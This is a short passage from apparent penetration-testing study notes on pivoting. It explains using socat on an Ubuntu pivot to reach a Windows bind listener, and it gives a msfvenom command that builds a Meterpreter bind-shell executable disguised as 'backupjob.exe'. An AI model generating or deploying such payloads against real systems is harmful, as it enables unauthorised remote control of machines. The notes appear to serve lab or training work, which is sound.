![[Pasted image 20260319143630.png]]
- Instead of the target calling back to us, the Windows host starts a listener on a port. We run socat on the Ubuntu pivot to bridge the gap — it accepts our incoming connection and forwards it straight to the Windows bind port, giving us a shell without direct access to the target.

#### Creating the Windows Payload (Bind shell)
```python
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```
